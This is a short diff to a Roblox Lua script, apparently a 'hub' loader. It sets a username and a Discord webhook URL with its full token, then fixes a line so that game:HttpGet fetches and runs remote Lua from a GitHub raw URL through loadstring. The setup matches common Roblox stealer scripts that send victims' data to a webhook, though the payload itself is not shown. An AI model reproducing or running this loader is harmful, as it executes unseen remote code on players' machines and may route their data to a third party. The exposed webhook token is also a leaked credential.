@@ -2,4 +2,4 @@ _G.Username "cristibuna"
 _G.HubName "Rafa Hub"
 _G.WebhookUrl "https://discord.com/api/webhooks/1125001326363942992/bPEJaiNAuETo8FLzwEeWlVXtdak5S874_p8sBWYyWjnlHeU4nibbfGrW4HYrHiBteaKY"
 
-loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua%22))() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
